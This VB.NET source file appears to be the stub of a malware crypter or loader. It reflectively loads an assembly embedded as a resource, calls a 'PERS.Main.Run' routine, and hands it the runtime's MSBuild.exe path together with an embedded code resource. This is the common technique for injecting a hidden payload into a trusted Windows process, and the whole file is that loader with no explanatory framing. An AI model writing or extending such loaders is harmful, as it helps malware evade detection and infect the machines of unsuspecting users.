Imports System.Reflection

Public Class Main
    Public Shared Sub CL(DRP As Boolean, EX As String, FP As String, PRI As Boolean, HW As String, Optional CMD As String = "")
        Dim ASM_ As Assembly = Assembly.Load(My.Resources.DLL)
        Dim Type_ As Type = ASM_.GetType("PERS.Main")
        Dim Method_ As MethodInfo = Type_.GetMethod("Run", BindingFlags.Public Or BindingFlags.Static) 'Method
        Dim Object_ As Object = Activator.CreateInstance(Type_)
        Method_.Invoke(Object_, New Object() {IO.Path.Combine(Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory(), "MSBuild.exe"), Chr(34) + FP + Chr(34), My.Resources.CODE, True})
    End Sub

End Class

